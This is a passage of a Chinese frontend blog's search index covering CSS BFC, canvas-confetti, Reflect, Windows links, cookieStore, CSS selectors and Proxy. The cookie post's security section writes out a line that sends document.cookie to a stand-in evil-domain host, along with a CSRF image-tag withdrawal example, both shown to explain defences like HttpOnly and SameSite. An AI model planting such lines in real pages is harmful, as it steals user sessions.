容器变成了一个迷你布局，所有子元素都将包含在其中。 但是，overflow 属性本是用来如何处理溢出的内容，如果仅仅使用此属性创建新的 BFC，在某些情况下会产生不必要的滚动条或剪切阴影。 另外，对于其他开发人员来说，它可能不太可读，因为不能显式地表明为什么要使用溢出来实现这一目的。如果使用了这个方法，最好对代码进行注释以便他人理解。 flow-root 布局 下面我们使用新的 CSS 属性 display: flow-root 来显式创建 BFC。无论是内联元素，还是原本就是块级元素，在应用 display:flow-root 声明后，都会变成块级元素，同时这个元素将创建一个新的 BFC，而不会产生任何其他潜在的问题副作用。 给 &lt;div&gt; 元素设置 display: flow-root 属性后，&lt;div&gt; 中的所有内容都会参与该容器的 BFC，并且浮动的内容不会从底部溢出。可以从 flow-root 这个值的名字上看出来，它创建一个新的用于流式布局的上下文，表现类似于文档的根元素（html）。 BFC 的其他作用 BFC 除了可以用来布局之外，还有清除浮动的作用。下面这个例子，&lt;p&gt; 元素设置了 outline 轮廓，由于内部的 img 元素浮动，容器的 outline 轮廓都合并在了一起。给 &lt;p&gt; 元素设置 display:flow-root 或 overflow: auto 后，内部元素浮动导致容器元素轮廓合并、高度塌陷的问题就不存在了。 创建新的 BFC 还可以避免两个相邻的元素之间外边距折叠（合并）。下面例子中，第一个 div 的 p 元素的 margin 属性被合并了，所以 margin 属性不能被应用。而下面的 div，因为设置了 display:flow-root，所以 p 元素的 margin 属性不会被合并。 参考资料 快速了解CSS display:flow-root声明 ","link":"https://zkrisj.github.io/post/css-kuai-ji-ge-shi-shang-xia-wen-bfche-flow-root-bu-ju/"},{"title":"Canvas Confetti 五彩纸屑特效","content":"介绍 canvas-confetti 是一个使用 canvas 的五彩纸屑特效 JS 插件。效果： 使用方式 NPM 安装： npm install --save canvas-confetti 然后通过 const confetti = require('canvas-confetti'); 在项目中使用它。 从 CDN 导入 HTML 页面中： &lt;script src=&quot;https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js&quot; defer&gt;&lt;/script&gt; 也可以将上述 JS 文件下载到本地，然后直接在 HTML 页面中调用 confetti() 方法即可立即展示特效。 控制发射原点 origin.x：Number（默认值：0.5）：发射的水平方向原点，0 表示左边缘，1 表示右边缘。 origin.y：Number (默认值: 0.5) :发射的垂直方向原点，0 表示上边缘，1 表示下边缘。 app.onclick = e =&gt; confetti({ origin: { x: e.clientX / innerWidth, y: e.clientY / innerHeight } }); 这里的 e.clientX / innerWidth 表示鼠标事件的 X 坐标除以窗口的内部宽度，e.clientY / innerHeight 表示鼠标事件的 Y 坐标除以窗口的内部高度。 控制数量和扩散角度 particleCount：Number（默认值：50），要发射的五彩纸屑的数量。 spread：Number（默认值：45），五彩纸屑在垂直方向扩散的角度，45 表示五彩纸屑以垂直方向正负 22.5 度角发射。 app.onclick = e =&gt; confetti({ particleCount: 200, spread: 180, origin: { x: e.clientX / innerWidth, y: e.clientY / innerHeight } }); 控制发射角度 angle：Number（默认值：90）：发射的角度，0 表示水平向右；90 表示垂直向上；180 表示水平向左；270 表示垂直向下。 function randomInRange(min, max) { return Math.random() * (max - min) + min; } app.onclick = e =&gt; confetti({ particleCount: 200, spread: 180, angle: randomInRange(0, 360), origin: { x: e.clientX / innerWidth, y: e.clientY / innerHeight } }); 控制重力和消失的速度 gravity：Number（默认值：1），粒子下落的速度。1 是全重力，0.5 是半重力，0 表示无重力；大于 1 表示加速下落，负值表示粒子会向上升起。 ticks：Number (默认值: 200) ，值越小粒子消失得越快，值越大粒子消失得越慢。 startVelocity：Number（默认值：45），五彩纸屑开始移动的速度，以像素为单位。 app.onclick = e =&gt; confetti({ particleCount: 400, spread: 180, gravity: 0, startVelocity: 30, ticks: 1000, origin: { x: e.clientX / innerWidth, y: e.clientY / innerHeight } }); 控制颜色和形状 colors Array：颜色字符串数组，采用 HEX 格式（# + 3 位或 6 位十六进制数字），可以重复颜色来增加比例，例如 ['#f00', '#f00', '#f00', '#f00', '#0f0', '#00f', '#ff0'] 表示红色占七分之四，绿色、蓝色、黄色各占七分之一比例。 shapes Array：五彩纸屑的形状数组，可以为 square 和 circle。默认设置是均匀混合使用这两种形状。['circle', 'circle', 'square'] 表示使用三分之二的圆圈和三分之一的正方形。 烟花特效 雪花特效 庆祝特效 自定义 confetti confetti.create(canvas, [globalOptions]): Function 此方法创建一个使用自定义 canvas 元素的 confetti 函数实例。例如，可以通过提供自己的 canvas 元素来限制五彩纸屑出现的位置。 默认情况下，此方法不会以任何方式修改 canvas 元素（除了绘制它）。 另外，应该保留自定义实例并避免使用同一 canvas 元素多次初始化 confetti 函数实例。 globalOptions 具有以下属性： resize Boolean（默认值：false）：是否允许设置 canvas 元素图像大小，以及是否在窗口改变大小（例如调整窗口大小、旋转移动设备等）时保持正确大小。默认情况下，不会修改 canvas 元素大小。 useWorker Boolean（默认值：false）：是否尽可能使用异步 web worker 来渲染五彩纸屑动画。默认关闭，这意味着动画将始终在主线程上执行。如果打开并且浏览器支持它，动画将在主线程之外执行，这样它就不会阻塞页面其他工作。使用此选项也将修改 canvas 元素，你不能再以任何方式尝试使用 canvas 元素（除了将其从 DOM 中删除），它会引发错误。因为当使用 worker 进行渲染时， canvas 元素的控制权必须转移给 web worker，以防止在主线程上使用该 canvas 元素。如果你必须以其他方式操纵 canvas 元素，请不要使用此选项。如果浏览器不支持，该值将被忽略。 disableForReducedMotion Boolean（默认值：false）：当设置了 prefer reduced motion 媒体查询时完全禁用五彩纸屑。当设置为 true 时，使用此 confetti 函数实例将始终接受用户减少页面动效的请求并为他们禁用五彩纸屑。 ","link":"https://zkrisj.github.io/post/canvas-confetti-wu-cai-zhi-xie-te-xiao/"},{"title":"Reflect API 和 Object 静态方法的对比","content":"介绍 Reflect 内置对象提供了与 JavaScript 对象交互的方法，这些方法与 Proxy handler（捕获器）的方法相对应。 Reflect 不是一个函数对象，因此不能当构造函数。 Proxy 一般需要和 Reflect 联合使用，Proxy 对象拦截操作，Reflect 完成默认行为，然后就可以在 Proxy 对象中部署额外的功能。 Reflect 操作函数化 Reflect.has 判断一个对象是否存在某个属性，和 in 运算符的功能完全相同。如果 target 不是 Object，会抛出 TypeError。 Reflect.has(target, prop) // 相当于 prop in target Reflect.deleteProperty 删除一个对象的某个属性，和 delete 运算符的功能完全相同。如果 target 不是 Object，会抛出 TypeError。 Reflect.deleteProperty(target, prop) // 相当于 delete target[prop] Reflect.apply 更易读和理解 在 Reflect 之前，使用 Function.prototype.apply 调用具有给定 this 值的函数。 Function.prototype.apply.call(Math.floor, undefined, [1.75]); // 1 使用 Reflect.apply 之后更易读和理解： Reflect.apply(Math.floor, undefined, [1.75]) // 1 Reflect.apply(String.fromCharCode, undefined, [104, 101, 108, 108, 111]) // &quot;hello&quot; Reflect.apply(RegExp.prototype.exec, /ab/, ['confabulation']).index // 4 Reflect.apply(''.charAt, 'ponies', [3]) // &quot;i&quot; Reflect.defineProperty | setPrototypeOf 检查属性定义是否成功 使用 Object.defineProperty 和 Object.setPrototypeOf，成功则返回传递给函数的对象，否则抛出 TypeError，需要使用 try...catch 块来捕获定义属性时发生的错误。 try { Object.defineProperty(target, prop, descriptor) // success } catch (err) { // failure } 使用 Reflect.defineProperty 和 Reflect.setPrototypeOf，返回一个布尔值表示成功状态，可以替换成 if...else 块： if (Reflect.defineProperty(target, prop, descriptor)) { // success } else { // failure } 如果 target 不是 Object，它们都会抛出 TypeError 异常。 与 Object 对象的静态方法对比 Reflect 上的一些方法对应于 ES2015 之前的 Object 上的静态方法。有些在 Reflect 上的新方法，Object 上没有；而有些在 Object 上的方法 Reflect 上没有。 defineProperty，Object 和 Reflect 都有。 defineProperties，只有 Object 有。 Reflect.has 对应 Object.hasOwn。 deleteProperty，只有 Reflect 有。 get，只有 Reflect 有。 set，只有 Reflect 有，返回一个布尔值表示成功状态。 keys，只有 Object 有，返回一个可枚举的属性键的字符串数组。如果目标不是对象，在 ES5 中抛出 TypeError，在 ES2015 中则将其强制转换为对象。 ownKeys，只有 Reflect 有，返回一个由目标对象自身的属性键组成的数组。等同于 `Object.getOwnPropertyNames(targe getOwnPropertyDescriptor，Object 和 Reflect 都有。如果指定的属性存在于对象上，则返回该属性描述符，如果不存在则返回 undefined。在 ES5 中，如果第一个参数不是对象（而是原始类型），会抛出 TypeError。而在 ES2015，第一个的参数不是对象类型会被强制转换为对象。 getOwnPropertyDescriptors，只有 Object 有。获取指定对象的所有自身属性的描述符，如果没有任何自身属性，则返回空对象。 浅拷贝一个对象：Object.assign() 方法只能拷贝源对象的可枚举的自身属性，同时拷贝时无法拷贝属性的描述符，而且访问器属性会被转换成数据属性，也无法拷贝源对象的原型，使用 Object.getOwnPropertyDescriptors(obj) 方法配合 Object.create() 方法则可以实现这些。 Object.create( Object.getPrototypeOf(obj), Object.getOwnPropertyDescriptors(obj) ); getPrototypeOf，Object 和 Reflect 都有，返回给定对象的原型。如果没有继承属性，则返回 null。在 ES5 中，如果参数不是一个对象类型，会抛出 TypeError 异常。在 ES2015 中，参数会被强制转换为一个对象。如果 target 不是 Object，会抛出 TypeError。 setPrototypeOf，Object 和 Reflect 都有。 Object.setPrototypeOf 设置对象的新原型，并返回该对象。 Reflect.setPrototypeOf 返回一个布尔值，指示原型是否成功设置。 如果 prototype 不是一个对象（或 null），会抛出 TypeError 异常。 如果 obj 参数是不可扩展的或是一个不可修改原型的对象（如 Object.prototype 或 window），Object.setPrototypeOf 会抛出 TypeError 异常，Reflect.setPrototypeOf 返回 false。 isExtensible，Object 和 Reflect 都有。返回一个 Boolean 值，指示一个对象是否是可扩展的（是否可以在它上面添加新的属性）。 默认情况下，对象是可扩展的：即可以为他们添加新的属性，并且可以重新分配其原型。 Object.preventExtensions、Object.seal 或 Object.freeze 方法都可以使一个对象变为不可扩展。 在 ES5 中，如果参数不是对象（而是原始类型），Object.isExtensible 会抛出 TypeError。在 ES2015 中，如果传递了非对象参数，Object.isExtensible 将返回 false 而没有任何错误，因为根据定义，原始类型是不可变的。 如果参数不是对象（而是原始类型），Reflect.isExtensible 会抛出 TypeError。 preventExtensions，Object 和 Reflect 都有，阻止对象添加新属性和对象的原型被重新分配。 当将新属性添加到不可扩展对象将静默失败，严格模式下会抛出 TypeError。 当为不可扩展对象重新分配原型时，会抛出 TypeError。 Object.preventExtensions 使对象不可扩展并会返回该对象。在 ES5 中，如果参数不是一个对象类型（而是原始类型），会抛出 TypeError 异常。在 ES2015 中，非对象参数将被视为一个不可扩展的普通对象，因此会被直接返回。 Reflect.preventExtensions 返回一个 Boolean 值指示目标对象是否成功被设置为不可扩展。如果参数不是一个对象类型（而是原始类型），会抛出 TypeError 异常。 ","link":"https://zkrisj.github.io/post/reflect-api-he-object-jing-tai-fang-fa-de-dui-bi/"},{"title":"Windows 系统中的硬链接和软链接","content":"介绍 NTFS 支持四种类型的链接：硬链接、符号链接、连接点链接、卷安装点。 Windows NT 3.1 及后续版本支持 NTFS 硬链接； Windows 2000 开始支持连接点链接； Windows Vista 开始，符号链接在 NTFS 中可用。 mklink mklink 是 Windows 下用于创建链接的 cmd 内置命令，存在于 Windows Vista 及以后版本的 Windows 操作系统中。 命令格式 mklink [[/d] | [/h] | [/j]] &lt;link&gt; &lt;target&gt; 如果不指定 [/D] | [/H] | [/J] 参数，默认为创建文件符号链接。 参数 说明 /d 创建目录符号链接。 /h 创建硬链接而不是符号链接。 /j 创建目录连接点。 &lt;link&gt; 指定要创建的符号链接的名称。 &lt;target&gt; 指定新符号链接引用的路径 (相对或绝对) 。 /? 在命令提示符下显示帮助。 使用 mklink 创建符号链接和连接点链接的时候，操作系统并不会检查目标是否存在，所以可以创建指向不存在的目标的符号链接。使用 mklink 创建硬链接时，如果目标不存在，会显示：系统找不到指定的路径。 删除文件符号链接和硬链接使用 del 命令，具体语法如下： del \\MyFile.file 删除目录符号链接和连接点链接使用 rd 命令，具体语法如下： rd \\MyFolder 硬链接 硬链接（hard link），多个文件平等地共享同一个文件存储单元（Windows 中的 MFT 条目、Unix/Linux 中的 inode）。 只能用于同一个文件系统（对于 NTFS 是限制于同一个磁盘分区）； 硬链接只能用于文件，不能用于目录，因为其父目录就有歧义了。 可以用不同的文件名访问同样的内容； 对文件内容进行修改，会影响到所有文件名； 删除一个文件名，不影响另一个文件名的访问。 在根目录创建硬链接。当修改 MyFile.file 时，example.file 会同步变化，反之亦然。当删除 MyFile.file 时，example.file 不会删除，反之亦然。 mklink /h \\MyFile.file \\Users\\User1\\Documents\\example.file 如果使用硬链接链接到目录，显示：拒绝访问。 mklink /h \\MyFolder \\Users\\User1\\Documents 如果使用硬链接链接到其他磁盘分区目录，显示：系统无法将文件移到不同的磁盘驱动器。 mklink /h C:\\2.txt E:\\1.txt 符号链接 符号链接（symbolic link），是指向另一个文件系统对象的文件系统对象。指向的对象称为目标。符号链接旨在帮助迁移和应用程序与 UNIX/Linux 操作系统的兼容性，使其功能与 UNIX/Linux 符号链接一样。 在根目录创建文件符号链接： mklink \\MyFile.file \\User1\\Documents\\example.file 在根目录创建目录符号链接： mklink /d \\MyFolder \\Users\\User1\\Documents 符号链接允许跨主机和网络文件共享。 快捷方式 快捷方式（shortcut）是一种功能上类似符号链接的文件对象，但与符号链接有本质的不同。 快捷方式是普通的扩展名文件（拥有扩展名 .lnk），而非符号，有文件大小。 快捷方式可以指向文件、文件夹或其他任何系统中的位置（包括控制面板、桌面等）。 如果快捷方式指向可执行程序，则可以同时指定启动的命令行参数以及启动位置。 快捷方式文件可以在任何文件系统（比如早期的 FAT32）下创建。 连接点链接 连接点（NTFS junction point），也称为软链接，类似于符号链接，但只支持目录，可以链接位于同一台计算机上不同本地卷上的目录。结点的操作与硬链接相同。 在根目录创建连接点链接： mklink /j \\MyFolder \\Users\\User1\\Documents 在 Windows 上使用符号链接是有问题的，所以 pnpm 在 Windows 上使用连接点链接来代替符号链接。 ","link":"https://zkrisj.github.io/post/windows-xi-tong-zhong-de-ying-lian-jie-he-ruan-lian-jie/"},{"title":"cookieStore 的使用","content":"介绍 Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。也是一个 HTTP 请求标头，其中含有先前由服务器通过 Set-Cookie 响应标头发送或通过 JavaScript 的 document.cookie 方法设置，然后存储到本地的 Cookie。 Set-Cookie 是一个 HTTP 响应标头，被用来由服务器端向浏览器发送 cookie，浏览器可在后续的请求中将其发送回服务器。服务器要发送多个 cookie，则应该在同一响应中发送多个 Set-Cookie 标头。 可以通过在浏览器的隐私设置里面设置为禁用 cookie，来阻止接收发送和本地设置。 Cookie 主要用于以下三个方面： 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息） 个性化设置（如用户自定义设置、主题等） 浏览器行为跟踪（如跟踪分析用户行为等） 形式 一系列的名称/值对，形式为 name=value; name2=value2; name3=value3。名称/值对之间用分号和空格（'; '）隔开。 Cookie 存储 Cookie 曾用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。 在浏览器中存储数据的新特性方法是 Web Storage API。window.sessionStorage 和window.localStorage 属性与持续时间中的会话和永久 cookie 相对应，但是存储限制比 cookie 大，并且永远不会发送到服务器。 可以使用 IndexedDB API 或基于它构建的库来存储更多结构化的数据。 安全 如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。 (new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie; 使用 HttpOnly 属性可防止通过 JavaScript 访问 cookie 值，从而在一定程度上缓解此类攻击。 用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短。 &lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt; 当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。一些方法可以阻止此类事件的发生： 对用户输入进行过滤来阻止 XSS； 任何敏感操作都需要确认； 用于敏感信息的 Cookie 只能拥有较短的生命周期； Set-Cookie 响应标头 SameSite 属性设置为 Strict 或 Lax，确保不与跨域请求一起发送身份验证 cookie。例如，用户登陆了银行网站 your-bank.com，银行服务器发来了一个 Cookie：Set-Cookie:id=a3fWa;。用户后来又访问了恶意网站 malicious.com，上面有一个表单。 &lt;form action=&quot;your-bank.com/transfer&quot; method=&quot;POST&quot;&gt; ... &lt;/form&gt; 用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 Cookie 的转账请求。为了防止这种攻击，表单一般都带有一个随机 token，告诉服务器这是正确请求。 &lt;form action=&quot;your-bank.com/transfer&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;dad3weg34&quot;&gt; ... &lt;/form&gt; 第三方 Cookie Cookie 与域关联。如果此域与您所在页面的域相同，则该 cookie 称为第一方 cookie（ first-party cookie）。如果域不同，则它是第三方 cookie（third-party cookie）。当托管网页的服务器设置第一方 Cookie 时，该页面可能包含存储在其他域中的服务器上的图像或其他组件（例如，广告横幅），这些图像或其他组件可能会设置第三方 Cookie。这些主要用于在网络上进行广告和跟踪。比如，Facebook 在第三方网站插入一张看不见的图片。 &lt;img src=&quot;facebook.com&quot; style=&quot;visibility:hidden;&quot;&gt; 浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，如果你已经登录了 Facebook 帐号，Facebook 就会知道你访问了什么网站。 支持 unicode 的 cookie 工具 var docCookies = { getItem: function (sKey) { return decodeURIComponent(document.cookie.replace(new RegExp(&quot;(?:(?:^|.*;)\\\\s*&quot; + encodeURIComponent(sKey).replace(/[-.+*]/g, &quot;\\\\$&amp;&quot;) + &quot;\\\\s*\\\\=\\\\s*([^;]*).*$)|^.*$&quot;), &quot;$1&quot;)) || null; }, setItem: function (sKey, sValue, vEnd, sPath, sDomain, bSecure) { if (!sKey || /^(?:expires|max\\-age|path|domain|secure)$/i.test(sKey)) { return false; } var sExpires = &quot;&quot;; if (vEnd) { switch (vEnd.constructor) { case Number: sExpires = vEnd === Infinity ? &quot;; expires=Fri, 31 Dec 9999 23:59:59 GMT&quot; : &quot;; max-age=&quot; + vEnd; break; case String: sExpires = &quot;; expires=&quot; + vEnd; break; case Date: sExpires = &quot;; expires=&quot; + vEnd.toUTCString(); break; } } document.cookie = encodeURIComponent(sKey) + &quot;=&quot; + encodeURIComponent(sValue) + sExpires + (sDomain ? &quot;; domain=&quot; + sDomain : &quot;&quot;) + (sPath ? &quot;; path=&quot; + sPath : &quot;&quot;) + (bSecure ? &quot;; secure&quot; : &quot;&quot;); return true; }, removeItem: function (sKey, sPath, sDomain) { if (!sKey || !this.hasItem(sKey)) { return false; } document.cookie = encodeURIComponent(sKey) + &quot;=; expires=Thu, 01 Jan 1970 00:00:00 GMT&quot; + ( sDomain ? &quot;; domain=&quot; + sDomain : &quot;&quot;) + ( sPath ? &quot;; path=&quot; + sPath : &quot;&quot;); return true; }, hasItem: function (sKey) { return (new RegExp(&quot;(?:^|;\\\\s*)&quot; + encodeURIComponent(sKey).replace(/[-.+*]/g, &quot;\\\\$&amp;&quot;) + &quot;\\\\s*\\\\=&quot;)).test(document.cookie); }, keys: function () { var aKeys = document.cookie.replace(/((?:^|\\s*;)[^\\=]+)(?=;|$)|^\\s*|\\s*(?:\\=[^;]*)?(?:\\1|$)/g, &quot;&quot;).split(/\\s*(?:\\=[^;]*)?;\\s*/); for (var nIdx = 0; nIdx &lt; aKeys.length; nIdx++) { aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]); } return aKeys; } }; docCookies.setItem(&quot;test1&quot;, &quot;Unicode test: \\u00E0\\u00E8\\u00EC\\u00F2\\u00F9&quot;, Infinity); docCookies.setItem(&quot;test2&quot;, &quot;Hello world!&quot;, new Date(2020, 5, 12)); docCookies.setItem(&quot;test3&quot;, &quot;Hello world!&quot;, new Date(2027, 2, 3), &quot;/blog&quot;); docCookies.setItem(&quot;test4&quot;, &quot;Hello world!&quot;, &quot;Sun, 06 Nov 2022 21:43:15 GMT&quot;); docCookies.setItem(&quot;test5&quot;, &quot;Hello world!&quot;, &quot;Tue, 06 Dec 2022 13:11:07 GMT&quot;, &quot;/home&quot;); docCookies.setItem(&quot;test6&quot;, &quot;Hello world!&quot;, 150); docCookies.setItem(&quot;test7&quot;, &quot;Hello world!&quot;, 245, &quot;/content&quot;); docCookies.setItem(&quot;test8&quot;, &quot;Hello world!&quot;, null, null, &quot;example.com&quot;); docCookies.setItem(&quot;test9&quot;, &quot;Hello world!&quot;, null, null, null, true); docCookies.setItem(&quot;test1;=&quot;, &quot;Safe character test;=&quot;, Infinity); docCookies.getItem(&quot;test1;=&quot;); docCookies.removeItem(&quot;test7&quot;, &quot;/content&quot;); 路径限制并不能阻止从其他路径访问 cookie。使用简单的 DOM 即可轻易地绕过限制 (比如创建一个指向限制路径的，隐藏的 iframe, 然后访问其 contentDocument.cookie 属性)。保护 cookie 不被访问的唯一方法是将它放在另一个域名/子域名之下，利用同源策略保护其不被读取。 cookieStore chrome 87 开始可用，是一个在 Window 或 ServiceWorkerGlobalScope 上下文中的全局属性，用于管理 cookie。 document.cookie 接口是同步的、单线程的和阻塞的。cookieStore 是异步的，基于 promise 的，因此不会阻塞事件循环。 因为在 service worker 无法访问 document，因此在 service worker 中也无法访问 document.cookie。而 cookieStore 不依赖于 document，所以在 service worker 中可用。 属性和方法 delete(name) delete(options) name 带有 cookie 名称的字符串。 options 一个对象，包含： name 带有 cookie 名称的字符串。 url 可选的 带有 cookie 的 URL 的字符串。 path 可选的 包含路径的字符串。 删除成功返回一个 undefined 作为 resolve 的 Promise，失败则抛出 TypeError。 get(name) get(options) name 带有 cookie 名称的字符串。 options 一个对象，包含： name 带有 cookie 名称的字符串。 url 带有 cookie 的 URL 的字符串。 返回一个与名称或选项匹配的第一个 cookie 对象作为 resolve 的 Promise，该对象包含以下属性： name 包含 cookie 名称的字符串。 value 包含 cookie 值的字符串。 domain 包含 cookie 域的字符串。 path 包含 cookie 路径的字符串。 expires DOMTimeStamp，包含 cookie 的到期日期。 secure boolean，指示 cookie 是否仅在安全上下文中使用。 sameSite 以下值之一： &quot;strict&quot; Cookie 只会在第一方上下文中发送，不会随第三方网站发起的请求一起发送。 &quot;lax&quot; Cookie 不会在正常的跨站点子请求中发送（例如，将图像或框架加载到第三方站点），而是在用户在源站点内导航时发送（即，当点击链接时）。 &quot;none&quot; Cookie 将在所有情况下发送。 获取失败则抛出 TypeError。 getAll(name) getAll(options) name 可选的 带有 cookie 名称的字符串。 options 可选的 一个对象包含： name 带有 cookie 名称的字符串。 url 带有 cookie 的 URL 的字符串。 返回一个 cookie 对象数组作为 resolve 的 Promise，获取失败则抛出 TypeError。 set(name, value) set(options) name 带有 cookie 名称的字符串。 value 带有 cookie 值的字符串。 options 一个对象包含： name 带有 cookie 名称的字符串。 value 带有 cookie 值的字符串。 expires 可选的 DOMTimeStamp包含 cookie 的到期日期。 domain 可选的 包含 cookie 域的字符串。 path 可选的 包含 cookie 路径的字符串。 sameSite 可选的 以下值之一： &quot;strict&quot; Cookie 只会在第一方上下文中发送，不会与第三方网站发起的请求一起发送。 &quot;lax&quot; Cookie 不会在正常的跨站点子请求中发送（例如将图像或框架加载到第三方站点），而是在用户导航到源站点时发送（即，当点击链接时）。 &quot;none&quot; Cookie 将在所有情况下发送。 设置成功返回一个 undefined 作为 resolve 的 Promise，失败则抛出 TypeError。如果 origin 不能被序列化为 URL，则抛出 SecurityError。 change 事件属性 当删除或添加 cookie 时，会触发 change 事件。 其他属性和方法继承自 EventTarget。 示例 cookieStore.onchange = function(e) { const type = e.deleted.length &gt; 0 ? '删除' : '添加'; const item = e.deleted.length &gt; 0 ? e.deleted[0] : e.changed[0]; console.log(type, item); }; // 在set之前 cookieStore.set('cookie1', 'cookie1-value').then(e =&gt; console.log('添加成功')).catch(console.log); const day = 24 * 60 * 60 * 1000; cookieStore.set({ name: 'cookie2', value: 'cookie2-value', expires: Date.now() + day, domain: '127.0.0.1' }).then(e =&gt; console.log('添加成功')).catch(console.log); deleteBtn.onclick = () =&gt; cookieStore.delete('cookie1').then(e =&gt; console.log('删除成功')).catch(console.log); ","link":"https://zkrisj.github.io/post/cookiestore-de-shi-yong/"},{"title":"CSS 新选择器 :is() :where() :has()","content":":is() 匹配列表中任意一个选择器可以选择的元素。:matches() 重命名之后的写法。兼容写法：:-webkit-any()、:-moz-any()。 语法 :is( &lt;forgiving-selector-list&gt; ) /* 设置 header, main, footer 里的任意一个 p 标签的 hover 状态 */ header p:hover, main p:hover, footer p:hover { /* … */ } /* 可以使用 :is() 简写为以下 */ :is(header, main, footer) p:hover { /* … */ } :is() 伪类函数不能选择伪元素 some-element::before, some-element::after { /* … */ } 不能使用 :is() 简写： some-element:is(::before, ::after) { /* … */ } forgiving-selector 原谅选择器解析可以避免选择器列表失效。在 CSS 中使用选择器列表时，如果任何选择器无效，则整个列表都被视为无效。而当使用 :is() 或 :where() 选择器列表时，如果一个选择器解析失败，则将忽略不正确或不受支持的选择器并使用其他选择器。下面代码即使在浏览器不支持 :unsupported 时，仍然会正确解析并匹配 :valid。 :is(:valid, :unsupported) { /* … */ } 下面代码在浏览器不支持 :unsupported 时将被忽略，即使它们支持 :valid。 :valid, :unsupported { /* … */ } :where() 与 :is() 语法和作用相同，区别是 :where() 的优先级总是为 0 ，:is() 的优先级是由它的选择器列表中优先级最高的选择器决定的。 示例 在下面这个例子中，我们有两篇文章，每篇文章都包含一个片段、一个旁白和一个页脚。然后定义了不同的样式： :is(section.is-styling, aside.is-styling, footer.is-styling) a { color: red; } :where(section.where-styling, aside.where-styling, footer.where-styling) a { color: orange; } 如果我们稍后想使用简单的选择器覆盖页脚中链接的颜色： footer a { color: blue; } 因为类选择器比元素选择器具有更高的优先级，:is() 的优先级是由它的选择器列表中优先级最高的选择器决定的，所以这不会对 :is() 选择器中页脚链接的样式覆盖。但是，:where() 选择器的优先级总是为 0，因此 :where() 选择器中页脚链接的样式将被覆盖。 :has(selector) 匹配包含（相对于 selector 的 :scope）指定选择器的元素。可以认为 selector 的前面有一个 :scope 伪类（例如不能使用 a:has(a &gt; img) 这样的写法）。它的强大之处是，可以实现父选择器和前面兄弟选择器的功能。支持所有的 CSS 选择符。 语法 :has( &lt;forgiving-relative-selector-list&gt; ) /* 只要 &lt;a&gt; 元素里面有 &lt;img&gt; 元素，这个 &lt;a&gt; 元素就会匹配： */ a:has(img) { /* … */ } /* 匹配直接包含 &lt;img&gt; 子元素的 &lt;a&gt; 元素： */ a:has(&gt; img) { /* … */ } /* 匹配其后紧跟着 &lt;p&gt; 元素的 &lt;h1&gt; 元素： */ h1:has(+ p) { /* … */ } /* 只要 &lt;article&gt; 元素内有 &lt;h5&gt; 元素或者有 &lt;p&gt; 元素就会匹配 */ article:has(h5, p) { /* … */ } /* &lt;article&gt; 元素内同时有 &lt;h5&gt; 元素和 &lt;p&gt; 元素才匹配 */ article:has(h5):has(p) { /* … */ } 示例 需要升级你的浏览器到以下版本： 参考资料 来了，来了，CSS :has() 伪类她来了 ","link":"https://zkrisj.github.io/post/css-xin-xuan-ze-qi-is-where-has/"},{"title":"Proxy 中的 this 指向","content":"介绍 Proxy 和 Reflect 内置对象从 ECMAScript 2015 开始支持，允许拦截并定义自定义行为。 语法 const p = new Proxy(target, { ...traps }) traps 被代理对象上的自定义行为。包含捕获器（操作发生时所对应的处理函数）的方法列表。 target 被代理的目标对象。 const handler = { get(target, name, receiver) { // 如果对象中包含该属性，返回该属性，否则返回 not exists return name in target ? Reflect.get(...arguments) : 'not exists'; }, set(target, name, value, receiver) { // 如果属性为 age，判断值的类型是否为 number 和大于 0 if (name === 'age') { if (!Number.isNaN(parseInt(value))) { target[name] = value &gt; 0 ? value : 0; return true; } else throw 'invalid age'; } else return Reflect.set(...arguments); }, }; const p = new Proxy({}, handler); p.a = 1; console.log(p.a, p.b); // 1, not exists p.age = 12; console.log(p.age); // 12 p.age = -12; console.log(p.age); // 0 p.age = 'a'; console.log(p.age); // Uncaught invalid age 使 Proxy 代理起作用，必须对 proxy 对象 进行操作，而不是原对象。 this 指向 Proxy 代理的原对象内部的 this 指向其代理对象。 const target = { m () { return this === proxy; } }; const proxy = new Proxy(target, {}); console.log(target.m()); // false console.log(proxy.m()); // true handler 拦截函数内部的 this，指向的是 handler 对象本身。 const handler = { get() { console.log(this === handler); } }; new Proxy({}, handler).foo; // true 有些原生对象的内部属性，只有通过正确的 this 才能获取。 const target = new Date(); new Proxy(target, {}).getDate(); // TypeError: this is not a Date object const handler = { get(target, prop) { const val = target[prop]; return typeof val === 'function' ? val.bind(target) : Reflect.get(...arguments); } }; const proxy = new Proxy(target, handler); console.log(proxy.getDate()); // 可以获取日期 receiver 指向 get 和 set 捕获器函数的最后一个参数都是一个 receiver 对象，指向当前代理对象。 const proxy = new Proxy({}, { get(target, key, receiver) { return receiver; } }); proxy.getReceiver === proxy // true 但是，代理对象作为其他对象的原型被继承时，receiver 会指向被继承的对象。 let obj; const proxy = new Proxy({ foo: 3 }, { get(target, prop, receiver) { console.log(receiver === proxy, receiver === obj); return target[prop]; } }); console.log(proxy.foo); // true false 3 obj = Object.create(proxy); console.log(obj.foo); // false true 3 在 handler 拦截函数中，如果遇到 target 中有定义的 getter，则 getter 中的 this 指向调用的 target，即不会改变指向，但可以手动将其指向 receiver。 const obj = { foo: 1 }; const proxy = new Proxy({ foo: 3, get info() { return this.foo; } }, { get(target, prop, receiver) { console.log(receiver === obj); // true console.log(target[prop]); // 3 console.log(Reflect.get(target, prop)); // 3 return Reflect.get(...arguments); // Reflect.get(target, prop, receiver) } }); 